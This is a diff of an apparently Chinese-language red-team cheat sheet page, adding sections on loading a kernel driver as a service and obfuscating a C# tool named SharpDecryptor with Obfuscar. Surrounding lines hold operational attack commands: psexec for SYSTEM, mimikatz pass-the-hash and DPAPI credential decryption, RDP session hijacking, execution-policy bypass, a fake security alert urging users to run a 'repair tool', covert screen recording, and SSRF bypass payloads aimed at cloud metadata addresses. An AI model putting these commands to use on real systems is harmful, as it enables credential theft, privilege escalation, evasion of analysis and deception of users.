@@ -89,19 +89,21 @@
           ]},
           {title: "\u83b7\u53d6system", url: "#system", children: [
           ]},
+          {title: "\u52a0\u670d\u52a1", url: "#_10", children: [
+          ]},
           {title: "RDP\u5207\u4f1a\u8bdd", url: "#rdp_4", children: [
           ]},
-          {title: "\u6253\u5305\u89e3\u5305", url: "#_10", children: [
+          {title: "\u6253\u5305\u89e3\u5305", url: "#_11", children: [
           ]},
-          {title: "\u5b89\u5168\u65e5\u5fd7\u8def\u5f84", url: "#_11", children: [
+          {title: "\u5b89\u5168\u65e5\u5fd7\u8def\u5f84", url: "#_12", children: [
           ]},
           {title: "Windows\u51ed\u636e-\u89e3DPAPI", url: "#windows-dpapi", children: [
           ]},
           {title: "\u4ee5\u6307\u5b9a\u7528\u6237\u6765\u6253\u5f00\u4e00\u4e2acmd", url: "#cmd_1", children: [
           ]},
-          {title: "\u641c\u7d22\u5b57\u7b26\u4e32", url: "#_12", children: [
+          {title: "\u641c\u7d22\u5b57\u7b26\u4e32", url: "#_13", children: [
           ]},
-          {title: "\u6267\u884c\u547d\u4ee4\u4e14\u4e0d\u56de\u663e", url: "#_13", children: [
+          {title: "\u6267\u884c\u547d\u4ee4\u4e14\u4e0d\u56de\u663e", url: "#_14", children: [
           ]},
           {title: "\u6267\u884cPS\u6587\u4ef6", url: "#ps", children: [
           ]},
@@ -119,15 +121,18 @@
           ]},
           {title: "\u67e5\u770b\u6587\u4ef6MD5", url: "#md5_1", children: [
           ]},
-          {title: "\u5404\u4e2a\u73af\u5883\u53d8\u91cf", url: "#_14", children: [
+          {title: "\u5404\u4e2a\u73af\u5883\u53d8\u91cf", url: "#_15", children: [
           ]},
-          {title: "\u5b89\u5168\u65e5\u5fd7\u8def\u5f84", url: "#_15", children: [
+          {title: "\u5b89\u5168\u65e5\u5fd7\u8def\u5f84", url: "#_16", children: [
           ]},
-          {title: "\u5f39\u7a97", url: "#_16", children: [
+          {title: "\u5f39\u7a97", url: "#_17", children: [
           ]},
-          {title: "\u6301\u7eed\u622a\u5c4f", url: "#_17", children: [
+          {title: "\u6301\u7eed\u622a\u5c4f", url: "#_18", children: [
           ]},
           {title: "Localhost\u53d8\u79cd", url: "#localhost", children: [
+          ]},
+          {title: "C# \u6df7\u6dc6", url: "#c", children: [
+              {title: "Obfuscar", url: "#obfuscar" },
           ]},
         ];
 
@@ -696,7 +701,11 @@ powershell -ExecutionPolicy bypass -command &quot;&amp;{import-module C:\Users\P
 <p><code>auxiliary/scanner/smb/pipe_auditor</code>    msf这个插件需要认证</p>
 <p>rpcdump.py 192.168.14.100 这个不需要认证，可以访问未授权的东西</p>
 <h3 id="system">获取system</h3>
-<p><code>psexec.exe -accepteula -s -i -d cmd.exe</code></p>
+<pre><code>psexec.exe -accepteula -s -i -d cmd.exe
+</code></pre>
+<h3 id="_10">加服务</h3>
+<pre><code>sc create xxx binPath= C:\Users\admin\Desktop\1.sys type= kernel
+</code></pre>
 <h3 id="rdp_4">RDP切会话</h3>
 <p>前提是有其他用户的会话且是激活的，可以无视其他用户是不是锁屏。</p>
 <p>切换到system</p>
@@ -708,13 +717,13 @@ powershell -ExecutionPolicy bypass -command &quot;&amp;{import-module C:\Users\P
 <p>tscon切换会话</p>
 <p>确定需要切的会话ID，<code>quser</code>。</p>
 <p><code>tscon 1</code>切换过去。</p>
-<h3 id="_10">打包解包</h3>
+<h3 id="_11">打包解包</h3>
 <pre><code class="language-text-plain">压缩
 cabarc.exe -p -r N C:\Users\1.cab C:\Users\*.*
 解压
 cabarc.exe -p -r X Npp.cab
 </code></pre>
-<h3 id="_11">安全日志路径</h3>
+<h3 id="_12">安全日志路径</h3>
 <pre><code class="language-text-plain">C:\Windows\System32\Winevt\Logs\Security.evtx
 </code></pre>
 <h3 id="windows-dpapi">Windows凭据-解DPAPI</h3>
@@ -763,9 +772,9 @@ dpapi::masterkey /in:&quot;%appdata%\Microsoft\Protect\S-1-5-21-2552734371-81393
 <pre><code class="language-text-plain">mimikatz
 sekurlsa::pth /user:user /domain:domain /ntlm:hash /run:cmd.exe
 </code></pre>
-<h3 id="_12">搜索字符串</h3>
+<h3 id="_13">搜索字符串</h3>
 <p><code>string64.exe aaa.bin | findstr /i abc</code></p>
-<h3 id="_13">执行命令且不回显</h3>
+<h3 id="_14">执行命令且不回显</h3>
 <p><code>systeminfo 1&gt; c:\windows\temp\1 2&gt;&amp;1</code></p>
 <h3 id="ps">执行PS文件</h3>
 <pre><code class="language-text-plain">powershell -ep bypass -noexit -file ok.ps1
@@ -807,7 +816,7 @@ certutil -hashfile yourfilename.ext SHA1
 
 certutil -hashfile yourfilename.ext SHA256
 </code></pre>
-<h3 id="_14">各个环境变量</h3>
+<h3 id="_15">各个环境变量</h3>
 <pre><code>%ALLUSERSPROFILE% ： 列出所有用户Profile文件位置。  
 %COMSPEC% : CMD路径。
 
@@ -891,14 +900,14 @@ certutil -hashfile yourfilename.ext SHA256
 %tmp%------------------------------当前用户的临时目录  
 %temp%-----------------------------同上临时目录
 </code></pre>
-<h3 id="_15">安全日志路径</h3>
+<h3 id="_16">安全日志路径</h3>
 <p><code>C:\Windows\System32\Winevt\Logs\Security.evtx</code></p>
-<h3 id="_16">弹窗</h3>
+<h3 id="_17">弹窗</h3>
 <pre><code>shell mshta vbscript:Execute(&quot;msgbox &quot;&quot;别分析了大哥&quot;&quot;:close&quot;)
 
 msg %username% /time:1000 XXX集团安全平台提醒您：您的文档疑似感染宏病毒，请立即运行桌面的修复工具！
 </code></pre>
-<h3 id="_17">持续截屏</h3>
+<h3 id="_18">持续截屏</h3>
 <p><code>psr.exe /start /gui 0 /output C:\Users\Public\out.zip</code>
 <code>psr.exe /stop</code></p>
 <h3 id="localhost">Localhost变种</h3>
@@ -967,6 +976,29 @@ Enclosed Alphanumeric Bypasses :
 http:// 169.254.169.254/%0A
 http:// %E2%93%AA%E2%93%A7%E2%93%90%E2%91%A8%EF%BD%A1%E2%93%AA%E2%93%A7%E2%93%95%E2%93%94%EF%BD%A1%E2%93%AA%E2%93%A7%E2%93%90%E2%91%A8%EF%BD%A1%E2%93%AA%E2%93%A7%E2%93%95%E2%93%94:80/
 
+</code></pre>
+<h3 id="c">C# 混淆</h3>
+<h4 id="obfuscar">Obfuscar</h4>
+<p>生成目录新建xml</p>
+<pre><code class="language-XML">&lt;?xml version='1.0'?&gt;
+&lt;Obfuscator&gt;
+  &lt;Var name=&quot;InPath&quot; value=&quot;.&quot; /&gt;
+  &lt;Var name=&quot;OutPath&quot; value=&quot;.\Obfuscar&quot; /&gt;
+  &lt;Var name=&quot;KeepPublicApi&quot; value=&quot;true&quot; /&gt;
+  &lt;Var name=&quot;HidePrivateApi&quot; value=&quot;true&quot; /&gt;
+  &lt;Var name=&quot;HideStrings&quot; value=&quot;false&quot; /&gt;
+  &lt;Var name=&quot;UseUnicodeNames&quot; value=&quot;true&quot; /&gt;
+  &lt;Var name=&quot;ReuseNames&quot; value=&quot;true&quot; /&gt;
+  &lt;Var name=&quot;RenameFields&quot; value=&quot;true&quot; /&gt;
+  &lt;Var name=&quot;RegenerateDebugInfo&quot; value=&quot;true&quot; /&gt;
+  &lt;Module file=&quot;$(InPath)\SharpDecryptor.exe&quot; /&gt;
+
+  &lt;AssemblySearchPath path=&quot;C:\Program Files\dotnet\shared\Microsoft.WindowsDesktop.App\6.0.1\&quot; /&gt;
+  &lt;AssemblySearchPath path=&quot;C:\Program Files\dotnet\shared\Microsoft.NETCore.App\6.0.1\&quot; /&gt;
+&lt;/Obfuscator&gt;
+</code></pre>
+<p>添加生成事件</p>
+<pre><code>&quot;$(Obfuscar)&quot; obfuscar.xml
 </code></pre>
 
   <br>
